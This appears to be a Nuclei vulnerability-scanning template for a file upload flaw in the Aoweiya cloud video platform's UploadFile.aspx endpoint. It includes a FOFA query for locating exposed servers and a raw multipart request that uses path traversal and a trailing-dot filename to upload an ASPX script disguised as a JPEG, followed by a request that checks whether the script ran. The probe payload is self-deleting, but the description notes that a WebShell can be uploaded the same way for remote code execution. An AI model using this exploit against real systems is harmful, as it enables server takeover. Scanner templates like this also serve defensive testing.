id: aoweiya-cloud-video-uploadfile

info:
  name: "奥威亚云视频平台 UploadFile.aspx 文件上传漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="/Upload/DomainInfo/MaxAVALogo.png"
      
      奥威亚云视频平台 UploadFile.aspx 接口存在文件上传逻辑缺陷，攻击者可构造特定请求上传恶意文件（如WebShell），通过服务器端文件解析机制实现远程代码执行，最终导致目标系统权限被完全控制。
      
  tags: 奥威亚云视频平台

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /Services/WeikeCutOut/UploadFile.aspx?VideoGuid=/../../ HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate, br
    Content-Type: multipart/form-data; boundary=----sajhdjqwjejqwbejhqwbjebqwhje

    ------sajhdjqwjejqwbejhqwbjebqwhje
    Content-Disposition: form-data; name="file"; filename="NTest.aspx."
    Content-Type: image/jpeg

    <%@ Page Language="C#"%><% Response.Write("NdayTest"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
    ------sajhdjqwjejqwbejhqwbjebqwhje-
- raw:
  - |
    GET /NTest.aspx HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'NdayTest'
